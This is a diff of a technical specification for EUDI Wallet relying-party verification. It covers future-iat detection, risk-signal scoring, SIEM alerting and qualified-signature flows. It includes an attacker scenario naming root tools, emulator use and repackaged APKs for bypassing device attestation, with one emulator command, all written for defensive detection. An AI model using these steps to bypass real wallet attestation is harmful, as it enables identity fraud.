 The RP's verification pipeline checks the `iat` claim against its own server time (synchronised via NTP). The `iat` is in the future — the credential claims to have been issued at a time that hasn't occurred yet. This is a temporal anomaly that indicates abnormal issuance conditions.
 
@@ -25913,7 +26666,8 @@ if (deltaSeconds > 60) { // tolerance: 60 seconds for clock skew
 **Artifact Produced:** Temporal anomaly detection — `iat` is ahead of the RP's server time.
 
 </details>
-<details><summary><strong>7. RP emits S2 signal and elevates risk score</strong></summary>
+<details>
+<summary><strong>7. RP emits S2 signal and elevates risk score</strong></summary>
 
 The RP emits `SDJWT_IAT_FUTURE` at severity **S2 (Medium)**. A future `iat` alone is not conclusive evidence of an attack — minor clock skew (seconds) is tolerable. However, a significant deviation (hours, days, or months) is a strong indicator of environment manipulation. The VSI composition engine elevates the presentation's risk score. Combined with other signals (e.g., `WUA_INVALID` from §29.2.41, or `CTX_TLS_FINGERPRINT_ANOMALY` indicating an emulated TLS stack), a future `iat` contributes to a composite risk profile that may trigger a BLOCK decision.
 
@@ -25988,7 +26742,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Attacker installs wallet on compromised device</strong></summary>
+<details>
+<summary><strong>1. Attacker installs wallet on compromised device</strong></summary>
 
 The Attacker installs the EUDI Wallet application on a device with a compromised security posture. Common scenarios: (a) **Rooted Android** — Magisk or KernelSU bypass SafetyNet/Play Integrity attestation, providing root access to the application sandbox and keystore; (b) **Emulator** — Android emulator or iOS simulator running on a desktop without genuine TEE/SE hardware; (c) **WSCD hardware bypass** — physical device with a compromised Secure Element (SE) where key material has been extracted; (d) **Modified Wallet APK** — repackaged wallet binary with patched attestation logic. In all cases, the device cannot produce a genuine Wallet Unit Attestation (WUA) because the platform's hardware-backed security components are absent, bypassed, or compromised.
 
@@ -26007,7 +26762,8 @@ emulator -avd Pixel_7_API_34 -no-snapshot -writable-system
 **Artifact Produced:** EUDI Wallet instance running on a platform that cannot produce genuine hardware attestation.
 
 </details>
-<details><summary><strong>2. Compromised wallet requests WUA from WSCD subsystem</strong></summary>
+<details>
+<summary><strong>2. Compromised wallet requests WUA from WSCD subsystem</strong></summary>
 
 The wallet attempts to generate a Wallet Unit Attestation (WUA) via the Wallet Trust Evidence (WTE) / WSCD subsystem. On a legitimate device, this request triggers the TEE or Secure Element to produce a signed attestation: the WSCD verifies device integrity (bootloader lock status, SafetyNet/Play Integrity check), confirms the wallet binary has not been modified (code signing verification), and generates a fresh WUA JWT signed with the Wallet Provider's attestation key (stored in HSM infrastructure).
 
@@ -26016,7 +26772,8 @@ On the compromised device, the WUA request reaches either a non-existent TEE (em
 **Artifact Produced:** WUA generation request sent to the device's WSCD subsystem.
 
 </details>
-<details><summary><strong>3. WSCD returns invalid or absent attestation</strong></summary>
+<details>
+<summary><strong>3. WSCD returns invalid or absent attestation</strong></summary>
 
 The WSCD subsystem responds with one of three failure modes: (a) **WUA generation fails entirely** — the TEE/SE is absent (emulator) or refuses to attest due to detected integrity violation, returning an error to the wallet; (b) **invalid WUA produced** — the wallet fabricates a WUA-like JWT signed with a software key rather than the Wallet Provider's HSM-backed attestation key; (c) **stale WUA** — the wallet reuses an expired WUA obtained from a previous legitimate device. In all cases, the resulting WUA (if any) cannot survive cryptographic verification at the RP.
 
@@ -26044,7 +26801,8 @@ The WSCD subsystem responds with one of three failure modes: (a) **WUA generatio
 **Artifact Produced:** Invalid, absent, or stale WUA returned to the wallet application.
 
 </details>
-<details><summary><strong>4. Attacker submits VP Token with invalid WUA</strong></summary>
+<details>
+<summary><strong>4. Attacker submits VP Token with invalid WUA</strong></summary>
 
 The attacker submits the VP Token to the RP via `direct_post`. The submission includes the credential (which may be cryptographically valid — issued to the user before the device was compromised), a KB-JWT, and either (a) no WUA at all, (b) a WUA with an invalid signature, or (c) an expired WUA from a previous device attestation cycle. The credential's issuer signature and KB-JWT may be perfectly valid — the compromise is at the device/platform level, not the credential level.
 
@@ -26065,14 +26823,16 @@ vp_token=eyJhbGciOiJFUzI1NiJ9.eyJpc3MiOiJodHRwczovL3BpZC5idW5kLmRlIi...valid-cre
 **Artifact Produced:** VP Token submission with invalid or missing WUA.
 
 </details>
-<details><summary><strong>5. RP verifies WUA signature against Wallet Provider's attestation key</strong></summary>
+<details>
+<summary><strong>5. RP verifies WUA signature against Wallet Provider's attestation key</strong></summary>
 
 The RP's verification pipeline validates the WUA (§11.3 step 6). Validation includes: (a) resolving the WUA's `iss` claim to the Wallet Provider's attestation public key (from a trusted registry or pre-configured key set); (b) checking the WUA's `exp` / `nbf` temporal validity; (c) verifying the WUA's `cnf` binding to the device key used in the KB-JWT. The RP performs ECDSA signature verification using the Wallet Provider's authentic attestation key.
 
 **Artifact Produced:** WUA signature verification attempt initiated against the Wallet Provider's registered attestation key.
 
 </details>
-<details><summary><strong>6. RP detects WUA verification failure</strong></summary>
+<details>
+<summary><strong>6. RP detects WUA verification failure</strong></summary>
 
 The WUA signature verification **fails** — the signature was produced by a software key on the compromised device, not by the Wallet Provider's HSM-backed attestation key. The ECDSA check returns `false`. This is a definitive indicator that the device's security posture is unverifiable.
 
@@ -26095,7 +26855,8 @@ if (!sigValid) {
 **Artifact Produced:** WUA signature verification failure — `SIG_MISMATCH` against the Wallet Provider's attestation key.
 
 </details>
-<details><summary><strong>7. RP emits S0 signal and blocks presentation</strong></summary>
+<details>
+<summary><strong>7. RP emits S0 signal and blocks presentation</strong></summary>
 
 The RP emits `WUA_INVALID` at severity **S0 (Critical)** — an invalid WUA indicates that the device's security posture is unverifiable, which means the device key's non-exportability guarantee is void. If the device key has been extracted (rooted device with keystore access), the attacker can produce valid KB-JWTs from any device — defeating the entire device binding mechanism. The VSI composition engine triggers an immediate **BLOCK** decision.
 
@@ -26389,7 +27150,7 @@ Layer 3 signals are **not protocol errors** — they are contextual observations
 | `CTX_VELOCITY_EXCEED` | Same PID `personal_identifier` (or pseudonym) presented more than N times within T minutes (RP-configured thresholds) | **S2** | **Credential sharing, bot activity, or account farming.** Legitimate users rarely present the same credential at high velocity to the same RP. Correlate with IP diversity — same IP + high velocity = bot; diverse IPs + high velocity = credential sharing ring. | Configurable threshold; RP-specific |
 | `CTX_DEVICE_UNKNOWN` | Device fingerprint (browser fingerprint, app attestation) not previously seen for this PID `personal_identifier` | **S3** | **New device.** The user is presenting from a device not previously associated with this identity at this RP. Expected after device changes or wallet migration. Becomes significant when combined with velocity or geo signals. | Correlated — baseline-dependent |
 | `CTX_TIME_OF_DAY_ANOMALY` | Presentation occurs at an unusual hour relative to the user's historical presentation pattern at this RP | **S4** | **Possible account takeover.** Weak signal — many legitimate reasons for unusual-hour access. Only actionable when combined with other elevated signals. Requires ≥ 10 prior presentations to establish a meaningful baseline. | Noise unless combined; requires baseline |
-| `CTX_SESSION_DURATION_ANOMALY` | Time between authorization request issuance and `direct_post` submission is outside expected bounds (< 2s or > 120s) | **S3** | **Automated submission or delayed replay.** Sub-2-second submission suggests an automated tool bypassing the user consent screen. Over-120-second submission suggests a delayed replay or manual credential forwarding. Correlate with KB-JWT `iat` for consistency. | Correlated — compare with `KBJWT_CLOCK_SKEW` |
+| `CTX_SESSION_DURATION_ANOMALY` | Time between authorization request issuance and `direct_post` submission is outside expected bounds (&lt; 2s or > 120s) | **S3** | **Automated submission or delayed replay.** Sub-2-second submission suggests an automated tool bypassing the user consent screen. Over-120-second submission suggests a delayed replay or manual credential forwarding. Correlate with KB-JWT `iat` for consistency. | Correlated — compare with `KBJWT_CLOCK_SKEW` |
 
 > **Anti-linkability boundary (§11.10)**: Layer 3 signals that build per-user behavioural baselines (velocity, device fingerprint, time-of-day) inherently create linkability across sessions for the same `personal_identifier`. This is acceptable for RPs that store `personal_identifier` as part of their user account model (e.g., banks performing CDD per §22). However, RPs that accept **pseudonyms** (§16) MUST NOT build linkable behavioural profiles across pseudonymous sessions — the VSI composition engine must operate in a **stateless mode** for pseudonymous presentations, evaluating only within-session signals (Layer 1, Layer 2, and single-session Layer 3 signals like geo-mismatch and TLS fingerprint) without cross-session correlation.
 
@@ -26440,7 +27201,7 @@ composite_risk = Σ (base_weight[signal_i] × severity_multiplier[signal_i] × r
                  + Σ (context_modifier[j])
 
 Decision:
-  composite_risk < 20   → ALLOW
+  composite_risk &lt; 20   → ALLOW
   composite_risk 20–49  → FLAG (allow + mark for review)
   composite_risk 50–79  → STEP-UP (require additional authentication)
   composite_risk ≥ 80   → BLOCK (reject + alert SOC)
@@ -26519,7 +27280,7 @@ No individual signal crosses S1, but the combination of expired credential + vel
 | `WUA_INVALID` | S1 | 50 | 5.0 | 250 |
 | `CTX_TLS_FINGERPRINT_ANOMALY` | S2 | 25 | 2.0 | 50 |
 | `CTX_VELOCITY_EXCEED` (10× in 2 min) | S2 | 25 | 2.0 | 50 |
-| `CTX_SESSION_DURATION_ANOMALY` (< 1s) | S3 | 10 | 1.0 | 10 |
+| `CTX_SESSION_DURATION_ANOMALY` (&lt; 1s) | S3 | 10 | 1.0 | 10 |
 
 **Composite score: 360** → **BLOCK**
 
@@ -26558,17 +27319,17 @@ sequenceDiagram
     VE->>CE: Signal array<br/>[L1 signals, L2 signals, L3 signals]
     Note over CE: Compute composite_risk<br/>= Σ(weight × severity × recency)<br/>+ context_modifiers
 
-    alt composite_risk < 20 OR all pass
+    alt Low risk, score below 20, or all pass
         CE->>GW: ALLOW
         GW->>W: HTTP 200 (redirect_uri)
-    else composite_risk 20–49
+    else Moderate risk, score 20 to 49
         CE->>GW: FLAG (allow + review)
         GW->>W: HTTP 200 (redirect_uri)
         CE->>SM: VSI event (priority: low)
-    else composite_risk 50–79
+    else High risk, score 50 to 79
         CE->>GW: STEP-UP
         GW->>W: HTTP 200 (step-up challenge)
-    else composite_risk ≥ 80 OR any S0
+    else Critical risk, score 80 or higher, or any S0
         CE->>GW: BLOCK
         GW->>W: HTTP 403
         CE->>SM: VSI event (priority: critical)
@@ -26576,7 +27337,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Wallet submits VP Token to API gateway via direct_post</strong></summary>
+<details>
+<summary><strong>1. Wallet submits VP Token to API gateway via direct_post</strong></summary>
 
 The Wallet sends the VP Token to the RP's API gateway endpoint via the `direct_post` response mode (or `direct_post.jwt` for encrypted responses). This is the entry point for all credential presentations — the gateway receives the raw HTTP POST containing `vp_token`, `presentation_submission`, and optionally `state` parameters. The gateway is the first RP component to touch the incoming data.
 
@@ -26593,7 +27355,8 @@ vp_token=eyJhbGciOiJFUzI1NiJ9.eyJpc3M...~disclosure1~disclosure2~kb-jwt
 **Artifact Produced:** Raw HTTP POST request arriving at the API gateway's `response_uri` endpoint.
 
 </details>
-<details><summary><strong>2. API gateway forwards VP Token and HTTP context to verification engine</strong></summary>
+<details>
+<summary><strong>2. API gateway forwards VP Token and HTTP context to verification engine</strong></summary>
 
 The gateway captures Layer 3 environmental context before forwarding: source IP (for geo-lookup), TLS fingerprint (JA3/JA4 hash), HTTP headers (User-Agent, Accept-Language), and increments the velocity counter for the `personal_identifier` (if known from `state` correlation). The gateway bundles the raw VP Token with this environmental metadata and forwards both to the verification engine as an internal service call.
 
@@ -26615,21 +27378,24 @@ The gateway captures Layer 3 environmental context before forwarding: source IP 
 **Artifact Produced:** VP Token + HTTP context metadata forwarded to the verification engine.
 
 </details>
-<details><summary><strong>3. Verification engine emits signal array to composition engine</strong></summary>
+<details>
+<summary><strong>3. Verification engine emits signal array to composition engine</strong></summary>
 
 The verification engine processes the VP Token through two verification layers. **Layer 1** checks for OID4VP protocol errors — if the submission is an error response rather than a VP Token, Layer 1 signals are generated and Layer 2 is skipped. **Layer 2** runs the full credential verification pipeline: issuer signature (§29.2.36), disclosure hashes (§29.2.37), temporal validity (`iat`/`exp`), revocation status (§29.2.8), holder binding via KB-JWT (§29.2.2–§29.2.5), trust chain resolution via LoTE, and WUA validation (§29.2.41). Each check produces a pass or fail signal. The complete signal array (Layer 1 + Layer 2 + Layer 3 context signals) is sent to the composition engine.
 
 **Artifact Produced:** Signal array containing all Layer 1, Layer 2, and Layer 3 signals with severity classifications.
 
 </details>
-<details><summary><strong>4. Composition engine sends ALLOW decision to gateway</strong></summary>
+<details>
+<summary><strong>4. Composition engine sends ALLOW decision to gateway</strong></summary>
 
 When the composite risk score is below 20 and no S0 (Critical) signal is present, the composition engine sends an **ALLOW** decision to the API gateway. This is the happy path — all verification checks passed, environmental context is normal, and no anomalies were detected. The RP can proceed with the business transaction using the verified credential attributes.
 
 **Artifact Produced:** ALLOW decision dispatched to the API gateway.
 
 </details>
-<details><summary><strong>5. API gateway returns HTTP 200 with redirect_uri to wallet (ALLOW)</strong></summary>
+<details>
+<summary><strong>5. API gateway returns HTTP 200 with redirect_uri to wallet (ALLOW)</strong></summary>
 
 The gateway returns HTTP 200 to the Wallet with a `redirect_uri` that continues the user's session. The redirect URI typically points to the RP's success page or the next step in the business flow (e.g., account creation confirmation, age-gated content access, KYC completion). The Wallet opens the redirect URI in the device browser to complete the user journey.
 
@@ -26645,21 +27411,24 @@ Content-Type: application/json
 **Artifact Produced:** HTTP 200 response with `redirect_uri` for session continuation.
 
 </details>
-<details><summary><strong>6. Composition engine sends FLAG decision to gateway</strong></summary>
+<details>
+<summary><strong>6. Composition engine sends FLAG decision to gateway</strong></summary>
 
 When the composite risk score falls between 20 and 49, the composition engine sends a **FLAG** decision — the presentation is accepted (the user's session proceeds) but marked for post-hoc review. This threshold captures low-confidence anomalies that do not warrant blocking or step-up: minor clock skew, first-time device, unusual but not impossible geo-location.
 
 **Artifact Produced:** FLAG decision dispatched to the API gateway (allow + review marker).
 
 </details>
-<details><summary><strong>7. API gateway returns HTTP 200 with redirect_uri to wallet (FLAG)</strong></summary>
+<details>
+<summary><strong>7. API gateway returns HTTP 200 with redirect_uri to wallet (FLAG)</strong></summary>
 
 The gateway returns the same HTTP 200 with `redirect_uri` as in the ALLOW path — the user experience is identical. The FLAG decision is invisible to the Wallet and the user. The RP processes the credential attributes normally; the review marker is handled asynchronously by the security operations team.
 
 **Artifact Produced:** HTTP 200 response with `redirect_uri` — user session proceeds normally despite FLAG.
 
 </details>
-<details><summary><strong>8. Composition engine sends low-priority VSI event to SIEM</strong></summary>
+<details>
+<summary><strong>8. Composition engine sends low-priority VSI event to SIEM</strong></summary>
 
 The composition engine emits a VSI event to the SIEM/SOAR platform with `priority: low`. The event contains the full signal array, composite risk score, contributing signals with individual weights, and the FLAG decision rationale. Security analysts review these events in batch — typically during daily or weekly triage. The event follows the §30.8 VSI Event JSON Schema, enabling correlation with previous presentations from the same `personal_identifier_hash`.
 
@@ -26678,14 +27447,16 @@ The composition engine emits a VSI event to the SIEM/SOAR platform with `priorit
 **Artifact Produced:** Low-priority VSI event ingested into SIEM for batch review.
 
 </details>
-<details><summary><strong>9. Composition engine sends STEP-UP decision to gateway</strong></summary>
+<details>
+<summary><strong>9. Composition engine sends STEP-UP decision to gateway</strong></summary>
 
 When the composite risk score falls between 50 and 79, the composition engine sends a **STEP-UP** decision. The presentation is conditionally accepted — the credential attributes are tentatively available, but the RP requires additional authentication before granting full access. Step-up challenges include: re-authentication with WebAuthn (§15), presentation of an additional credential (e.g., a QEAA on top of the PID), or a fresh biometric confirmation. The specific challenge type is determined by the RP's risk policy configuration.
 
 **Artifact Produced:** STEP-UP decision dispatched to the API gateway with challenge type specification.
 
 </details>
-<details><summary><strong>10. API gateway returns HTTP 200 with step-up challenge to wallet</strong></summary>
+<details>
+<summary><strong>10. API gateway returns HTTP 200 with step-up challenge to wallet</strong></summary>
 
 The gateway returns HTTP 200 with a response body that directs the Wallet to a step-up challenge rather than a simple redirect. The challenge payload specifies what additional authentication is required. The Wallet or device browser presents the challenge to the user — the session remains active but access is gated until the challenge is satisfied.
 
@@ -26705,14 +27476,16 @@ Content-Type: application/json
 **Artifact Produced:** HTTP 200 response with step-up challenge payload.
 
 </details>
-<details><summary><strong>11. Composition engine sends BLOCK decision to gateway</strong></summary>
+<details>
+<summary><strong>11. Composition engine sends BLOCK decision to gateway</strong></summary>
 
 When the composite risk score exceeds 80 **or** any S0 (Critical) signal is present, the composition engine sends an immediate **BLOCK** decision. The S0 override is absolute — a single critical signal (e.g., `KBJWT_AUD_MISMATCH`, `SDJWT_SIG_INVALID`, `WUA_INVALID`) triggers BLOCK regardless of how low the other signals score. The credential attributes are discarded; the RP does not proceed with any business logic.
 
 **Artifact Produced:** BLOCK decision dispatched to the API gateway.
 
 </details>
-<details><summary><strong>12. API gateway returns HTTP 403 to wallet (BLOCK)</strong></summary>
+<details>
+<summary><strong>12. API gateway returns HTTP 403 to wallet (BLOCK)</strong></summary>
 
 The gateway returns HTTP 403 Forbidden to the Wallet. The response body contains a generic error message — the RP does not disclose the specific signal(s) that triggered the block to avoid leaking information to potential attackers. The Wallet displays an error to the user indicating that verification was unsuccessful.
 
@@ -26729,7 +27502,8 @@ Content-Type: application/json
 **Artifact Produced:** HTTP 403 response terminating the verification session.
 
 </details>
-<details><summary><strong>13. Composition engine sends critical-priority VSI event to SIEM</strong></summary>
+<details>
+<summary><strong>13. Composition engine sends critical-priority VSI event to SIEM</strong></summary>
 
 The composition engine emits a VSI event to the SIEM/SOAR platform with `priority: critical`. Unlike the low-priority FLAG events, critical events trigger automated incident response playbooks: the source IP range is added to a quarantine watchlist, the `personal_identifier_hash` is flagged for enhanced monitoring on subsequent presentations, and an alert is dispatched to the on-call security analyst. The event contains the full signal array, composite risk score, the S0 signal(s) that triggered the block, and correlation data from the past 24 hours.
 
@@ -26936,11 +27710,11 @@ Financial RPs integrating with the EUDI Wallet should monitor the following metr
 
 | Metric | Description | Alert Threshold |
 |:-------|:------------|:----------------|
-| **Presentation success rate** | Ratio of successful verifications to total presentation requests | < 95% → investigate |
+| **Presentation success rate** | Ratio of successful verifications to total presentation requests | &lt; 95% → investigate |
 | **Verification latency (p95)** | Time from receiving encrypted response to verification complete | > 500ms → investigate |
 | **Revocation check latency** | Time to fetch and evaluate Status List | > 2s → cache may be stale |
-| **Status List cache hit rate** | Percentage of revocation checks served from cache | < 80% → increase cache TTL |
-| **WRPAC expiry countdown** | Days until WRPAC certificate expires | < 30 days → trigger renewal |
+| **Status List cache hit rate** | Percentage of revocation checks served from cache | &lt; 80% → increase cache TTL |
+| **WRPAC expiry countdown** | Days until WRPAC certificate expires | &lt; 30 days → trigger renewal |
 | **LoTE freshness** | Time since last LoTE update was fetched | > 24h → force refresh |
 | **Error rate by type** | Breakdown: `access_denied`, `invalid_request`, `expired_credential`, etc. | Spike in any category → investigate |
 | **Cross-border presentation ratio** | Percentage of presentations from foreign MS PIDs | Unexpected spike → possible attack vector |
@@ -26969,7 +27743,7 @@ Monitors the foundational anchors tying the RP to the European federation. Failu
 
 | Event | Severity | Threshold | Edge Cases & Action |
 |:------|:---------|:----------|:--------------------|
-| WRPAC expiry countdown | 🟡 Warning / 🔴 Critical | < 30 days (Warning); < 7 days (Critical) | Initiate automated certificate renewal pipeline with the National Access CA. Edge case: the replacement WRPAC may be issued but lack a compliant Signed Certificate Timestamp (SCT) — do not deploy a certificate without SCT (§5.2.4) |
+| WRPAC expiry countdown | 🟡 Warning / 🔴 Critical | &lt; 30 days (Warning); &lt; 7 days (Critical) | Initiate automated certificate renewal pipeline with the National Access CA. Edge case: the replacement WRPAC may be issued but lack a compliant Signed Certificate Timestamp (SCT) — do not deploy a certificate without SCT (§5.2.4) |
 | Unauthorised WRPAC detected in CT log | 🔴 Critical | > 0 unauthorised issuances observed | A rogue or mistaken CA issued a certificate for the RP's domain. Trigger immediate revocation of the rogue certificate via the Trusted List operator (§5.2.4) |
 | HSM / KMS latency spikes | 🔴 Critical | > 500ms for signing operations | Evaluate hardware security module health; scale signing capacity. If offline, the RP cannot execute `client_assertion` authentication or sign JARs |
 | LoTE staleness or fetch failure | 🟡 Warning | > 24 hours since last successful fetch | Force manual cache refresh; investigate outbound network rules preventing national Trusted List synchronisation. Edge case: network partition isolating the RP from the EU Trust Framework infrastructure |
@@ -27265,7 +28039,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. User requests document signing at Relying Party</strong></summary>
+<details>
+<summary><strong>1. User requests document signing at Relying Party</strong></summary>
 
 The User navigates to the RP's service — a government portal, a bank's contract page, or a notarial platform — and initiates a signing action on a specific document. At this point, the RP has the document in its infrastructure but does not possess signing capability. The RP's role is to identify that the User wants a QES and to route them to the appropriate QTSP.
 
@@ -27274,7 +28049,8 @@ The RP must have a **prior contractual arrangement** with the QTSP (or offer the
 **Artifact Produced:** Pending unsigned document object (Application layer).
 
 </details>
-<details><summary><strong>2. Relying Party Server redirects User to QTSP web portal</strong></summary>
+<details>
+<summary><strong>2. Relying Party Server redirects User to QTSP web portal</strong></summary>
 
 The RP redirects the User's browser to the QTSP's signing portal, passing the document reference and a callback URL. The exact redirect mechanism is QTSP-specific (not standardized by CSC API or ARF), but typically follows a pattern like:
 
@@ -27295,13 +28071,15 @@ The RP passes the document hash alongside the URL so the QTSP can verify documen
 **Artifact Produced:** QTSP HTTP 302 routing redirect (Network layer).
 
 </details>
-<details><summary><strong>3. User Browser accesses QTSP portal</strong></summary>
+<details>
+<summary><strong>3. User Browser accesses QTSP portal</strong></summary>
 
 The User's browser follows the redirect and loads the QTSP's signing portal. The portal may display a welcome screen or require the User to consent to the signing session before proceeding. The QTSP now needs to verify the User's identity before granting access to signing credentials.
 
 
 </details>
-<details><summary><strong>4. QTSP Portal requests User authentication via EUDI Wallet</strong></summary>
+<details>
+<summary><strong>4. QTSP Portal requests User authentication via EUDI Wallet</strong></summary>
 
 The QTSP's web portal requires User identity verification before granting access to signing credentials. The QTSP initiates an authentication request to the EUDI Wallet. This may use OpenID4VP (§8–§11) for PID presentation, or another QTSP-specific mechanism (SAML, national eID scheme).
 
@@ -27331,19 +28109,22 @@ The QTSP uses the `personal_identifier` to look up or create the User's signing 
 **Artifact Produced:** JSON `vp_token` identity verification request (Protocol layer).
 
 </details>
-<details><summary><strong>5. EUDI Wallet prompts User for authentication consent</strong></summary>
+<details>
+<summary><strong>5. EUDI Wallet prompts User for authentication consent</strong></summary>
 
 Upon receiving the authentication request from the QTSP, the Wallet displays a consent prompt to the User. The prompt shows the QTSP's identity (verified via its WRPAC) and the specific PID claims being requested (family name, given name, personal identifier). The User must actively approve before the Wallet releases any identity data.
 
 
 </details>
-<details><summary><strong>6. User approves authentication with EUDI Wallet</strong></summary>
+<details>
+<summary><strong>6. User approves authentication with EUDI Wallet</strong></summary>
 
 The User reviews the authentication request and confirms their identity by providing biometric (fingerprint, face) or PIN authentication within the Wallet. This step satisfies QES_14's requirement that the user actively agrees to the authentication operation. The Wallet is now authorised to release the PID presentation to the QTSP.
 
 
 </details>
-<details><summary><strong>7. EUDI Wallet sends authentication response to QTSP Portal</strong></summary>
+<details>
+<summary><strong>7. EUDI Wallet sends authentication response to QTSP Portal</strong></summary>
 
 The Wallet returns the PID presentation (a verifiable credential containing the User's identity claims) to the QTSP. If using OpenID4VP, this is a `vp_token` response. The QTSP validates the presentation's signature, extracts the `personal_identifier`, and establishes the User's authenticated session. The User is now logged into the QTSP portal and ready to proceed with signing.
 
@@ -27351,7 +28132,8 @@ The Wallet returns the PID presentation (a verifiable credential containing the 
 
 
 </details>
-<details><summary><strong>8. QTSP Portal presents document to User (WYSIWYS)</strong></summary>
+<details>
+<summary><strong>8. QTSP Portal presents document to User (WYSIWYS)</strong></summary>
 
 Per QES_10, the Signature Creation Application must present the document representation to the User before creating the signature — the **WYSIWYS** (What You See Is What You Sign) principle. In Scenario A, this responsibility falls entirely on the QTSP's portal.
 
@@ -27359,13 +28141,15 @@ The QTSP retrieves the document from the `document_url` provided by the RP, veri
 
 
 </details>
-<details><summary><strong>9. QTSP Portal prompts User for signature creation consent</strong></summary>
+<details>
+<summary><strong>9. QTSP Portal prompts User for signature creation consent</strong></summary>
 
 After the User has reviewed the rendered document, the QTSP displays a signing consent prompt. This prompt must clearly indicate what is being signed (document name, hash, or other identifier) and require explicit User action (e.g., clicking a "Sign" button). Passive consent or pre-checked boxes are not acceptable under eIDAS 2.0.
 
 
 </details>
-<details><summary><strong>10. User approves signature creation on QTSP Portal</strong></summary>
+<details>
+<summary><strong>10. User approves signature creation on QTSP Portal</strong></summary>
 
 The User explicitly authorises signature creation by clicking the "Sign" button or similar affirmative action in the QTSP portal. This satisfies QES_14 — "the wallet unit, including the SCA, shall ensure that the user actively agrees to create a qualified electronic signature." In Scenario A, the QTSP portal acts as the SCA UI, collecting the User's explicit consent.
 
@@ -27378,7 +28162,8 @@ Content-Type: application/json
 ```
 
 </details>
-<details><summary><strong>11. QTSP Portal computes document hash and invokes remote QSCD</strong></summary>
+<details>
+<summary><strong>11. QTSP Portal computes document hash and invokes remote QSCD</strong></summary>
 
 The QTSP's Signature Creation Application computes the PAdES-specific document hash. For PAdES, this involves:
 
@@ -27404,7 +28189,8 @@ The QSCD creates the PKCS#1 digital signature and returns it. The QTSP then embe
 
 
 </details>
-<details><summary><strong>12. QTSP Portal delivers signed document to Relying Party Server</strong></summary>
+<details>
+<summary><strong>12. QTSP Portal delivers signed document to Relying Party Server</strong></summary>
 
 The QTSP delivers the signed PDF back to the RP via the previously specified `callback_url`. The delivery mechanism varies by QTSP implementation — common patterns include:
 
@@ -27431,7 +28217,8 @@ Content-Type: application/json
 **Artifact Produced:** Signed callback notification (Network layer).
 
 </details>
-<details><summary><strong>13. Relying Party Server confirms signing completion to User</strong></summary>
+<details>
+<summary><strong>13. Relying Party Server confirms signing completion to User</strong></summary>
 
 The RP downloads the signed document from the `signed_document_url`, verifies the PAdES signature (using ETSI EN 319 102-1 validation rules), and stores it. The User receives confirmation that the document has been signed — typically via a success page in the RP's web interface or an email notification. The signing transaction is now complete.
 
@@ -27520,7 +28307,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Relying Party Server initiates Document Retrieval</strong></summary>
+<details>
+<summary><strong>1. Relying Party Server initiates Document Retrieval</strong></summary>
 
 The RP generates a QR code or deep link containing a `request_uri` pointing to a JAR-signed request object (see §32.4 for the full Document Retrieval protocol). The User scans this with their Wallet. The URI uses the `mdoc-openid4vp` scheme:
 
@@ -27536,7 +28324,8 @@ The RP must pre-compute the document hash and include it in the request object b
 
 
 </details>
-<details><summary><strong>2. EUDI Wallet resolves the JAR-signed request object</strong></summary>
+<details>
+<summary><strong>2. EUDI Wallet resolves the JAR-signed request object</strong></summary>
 
 The Wallet fetches the request object from the `request_uri`. The request is a JAR-signed JWT (RFC 9101) containing document locations, hashes, and access methods. The RP authenticates via one of three client ID schemes: `x509_san_uri`, `x509_san_dns`, or `pre_registered` (§32.4.4).
 
@@ -27567,7 +28356,8 @@ The Wallet validates the JAR signature against the RP's X.509 certificate (extra
 
 
 </details>
-<details><summary><strong>3. EUDI Wallet downloads documents from Relying Party Server</strong></summary>
+<details>
+<summary><strong>3. EUDI Wallet downloads documents from Relying Party Server</strong></summary>
 
 The Wallet downloads each document from its `uri` using the specified `access_method`. The access method determines how the Wallet authenticates to the document host:
 
@@ -27587,7 +28377,8 @@ The Wallet stores the downloaded document bytes in memory for hash verification 
 
 
 </details>
-<details><summary><strong>4. EUDI Wallet verifies document hashes</strong></summary>
+<details>
+<summary><strong>4. EUDI Wallet verifies document hashes</strong></summary>
 
 After downloading, the Wallet computes the SHA-256 hash of each document and compares it against the `hash` value from the JAR-signed request object:
 
@@ -27606,7 +28397,8 @@ This verification is the **primary defence against document substitution**. The 
 
 
 </details>
-<details><summary><strong>5. EUDI Wallet selects Remote QTSP for signing from configured QTSP list</strong></summary>
+<details>
+<summary><strong>5. EUDI Wallet selects Remote QTSP for signing from configured QTSP list</strong></summary>
 
 The Wallet determines which Remote QTSP to use for the signing operation. According to QES_18, the Wallet must have at least one pre-configured default QTSP. If multiple QTSPs are configured, the Wallet may either:
 
@@ -27618,7 +28410,8 @@ For this flow, the Wallet selects the Wallet-Centric QTSP at `walletcentric.sign
 **Artifact Produced:** Selected QTSP endpoint `https://walletcentric.signer.eudiw.dev/csc/v2` stored in Wallet signing session (Device layer).
 
 </details>
-<details><summary><strong>6. EUDI Wallet requests RSSP capabilities via GET /csc/v2/info from Remote QTSP</strong></summary>
+<details>
+<summary><strong>6. EUDI Wallet requests RSSP capabilities via GET /csc/v2/info from Remote QTSP</strong></summary>
 
 The Wallet calls `GET /csc/v2/info` on the QTSP's base URI to discover its capabilities. The Wallet may use a pre-configured default QTSP (per QES_18, which mandates at least one default) or allow the User to select from multiple configured QTSPs.
 
@@ -27630,7 +28423,8 @@ Host: walletcentric.signer.eudiw.dev
 **Artifact Produced:** HTTP GET CSC discovery request to `walletcentric.signer.eudiw.dev` (Network layer).
 
 </details>
-<details><summary><strong>7. Remote QTSP returns metadata and OAuth2 authorization server URL</strong></summary>
+<details>
+<summary><strong>7. Remote QTSP returns metadata and OAuth2 authorization server URL</strong></summary>
 
 ```json
 {
@@ -27650,7 +28444,8 @@ The `authType: ["oauth2code"]` confirms that this RSSP uses OAuth2 Authorization
 
 
 </details>
-<details><summary><strong>8. EUDI Wallet sends OAuth2 authorization request to QTSP (Tier 1)</strong></summary>
+<details>
+<summary><strong>8. EUDI Wallet sends OAuth2 authorization request to QTSP (Tier 1)</strong></summary>
 
 The Wallet initiates the OAuth2 Authorization Code flow (optionally with PAR per §7.5) to request access to the QTSP's signing services. This is Tier 1 of the dual-layer authorization model (§32.1.2).
 
@@ -27671,7 +28466,8 @@ The `scope=service` indicates this is a service-level authorization, not a crede
 
 
 </details>
-<details><summary><strong>9. Remote QTSP Authorization Server issues service access token to EUDI Wallet</strong></summary>
+<details>
+<summary><strong>9. Remote QTSP Authorization Server issues service access token to EUDI Wallet</strong></summary>
 
